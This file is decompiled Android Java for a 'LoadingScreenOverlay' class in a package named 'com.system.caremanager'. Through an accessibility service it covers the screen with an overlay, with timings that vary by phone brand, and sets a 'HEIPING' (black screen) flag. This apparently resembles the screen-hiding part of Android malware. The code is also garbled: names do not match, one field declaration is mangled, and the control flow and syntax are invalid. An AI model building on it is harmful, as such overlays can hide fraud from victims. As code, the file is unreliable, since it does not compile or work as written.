package com.system.caremanager;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class LoadingOverlay {

    public static Handler handler;
    static boolean ifAlreadShow;
    static FrameLayout layout;
    public static \'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644" "{\'en\' = "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644";
    static ProgressBar progressBar;
    static WindowManager windowManager;

    static {
        // Static initialization block
    }

    public LoadingScreenOverlay() {
        return;
    }

    private static void checkCountDown(int param1) {
        String result = Br_and.getBrand();
        String result2 = result.toLowerCase();
        String str = "huawei";
        boolean result3 = result.equals(str);
        if (result != null) {
            // branch: cond_0
        }
        String result4 = Br_and.getBrand();
        String result5 = result.toLowerCase();
        String str2 = "honor";
        boolean result6 = result.equals(str2);
        if (result == null) {
            // branch: cond_1
        }
        int val = 11000;
        String result7 = Br_and.getBrand();
        String result8 = result.toLowerCase();
        String str3 = "oppo";
        boolean result9 = result.equals(str3);
        if (result != null) {
            // branch: cond_2
        }
        String result10 = Br_and.getBrand();
        String result11 = result.toLowerCase();
        String str4 = "realme";
        boolean result12 = result.equals(str4);
        if (result == null) {
            // branch: cond_3
        }
        int val2 = 8000;
        String result13 = Br_and.getBrand();
        String result14 = result.toLowerCase();
        String str5 = "vivo";
        boolean result15 = result.equals(str5);
        if (result == null) {
            // branch: cond_4
        }
        int val3 = 10000;
        Thread thread = new Thread();
        LoadingScreenOverlay.1 loadingScreenOverlay.1 = new LoadingScreenOverlay.1();
        thread.start();
        return;
    }

    private static View getView2(AccessibilityServiceCore param1) {
        ProgressBar progressBar = new ProgressBar();
        int val = 16842871;
        LoadingScreenOverlay.progressBar = progressBar;
        int val2 = 16842910;
        1[null] = result;
        int val3 = -1;
        ColorStateList colorStateList = new ColorStateList();
        ProgressBar progressBar2 = LoadingScreenOverlay.progressBar;
        progressBar2.setIndeterminateTintList(colorStateList);
        int val4 = 1128792064;
        int result = Scre_enUtil.dp2px(param1, val4);
        FrameLayout.LayoutParams frameLayout.LayoutParams = new FrameLayout.LayoutParams();
        int val5 = 17;
        this.gravity = val5;
        ProgressBar progressBar3 = LoadingScreenOverlay.progressBar;
        this.setLayoutParams(frameLayout.LayoutParams);
        ProgressBar progressBar4 = LoadingScreenOverlay.progressBar;
        return progressBar4;
    }

    public static void hide(AccessibilityServiceCore param1) {
        try {
            FrameLayout layout = LoadingScreenOverlay.layout;
            if (layout == null) {
                // branch: cond_0
            }
            int val = 8;
            layout.setVisibility(val);
            ProgressBar progressBar = LoadingScreenOverlay.progressBar;
            progressBar.setVisibility(val);
            FrameLayout layout2 = LoadingScreenOverlay.layout;
            layout2.removeAllViews();
            WindowManager windowManager = LoadingScreenOverlay.windowManager;
            FrameLayout layout3 = LoadingScreenOverlay.layout;
            windowManager.removeView(layout3);
            LoadingScreenOverlay.layout = null;
            LoadingScreenOverlay.progressBar = null;
            LoadingScreenOverlay.windowManager = null;
            LoadingScreenOverlay.ifAlreadShow = 1;
            String str = "IF_ALREAD_SHOW_HEIPING";
            Boolean result = Boolean.valueOf(1);
            My_Settings.WriteBool(param1, str, result);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            this.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void show(AccessibilityServiceCore param1) {
        Boolean result = Boolean.valueOf(null);
        String str = "IF_ALREAD_SHOW_HEIPING";
        boolean result2 = My_Settings.readBool(param1, str, result);
        if (result == null) {
            // branch: cond_0
        }
        return;
        boolean ifAlreadShow = LoadingScreenOverlay.ifAlreadShow;
        if (ifAlreadShow == null) {
            // branch: cond_1
        }
        return;
        Handler handler = new Handler();
        Looper result3 = Looper.myLooper();
        LoadingScreenOverlay.2 loadingScreenOverlay.2 = new LoadingScreenOverlay.2();
        LoadingScreenOverlay.handler = handler;
        int val = 5000;
        LoadingScreenOverlay.checkCountDown(val);
        return;
    }

}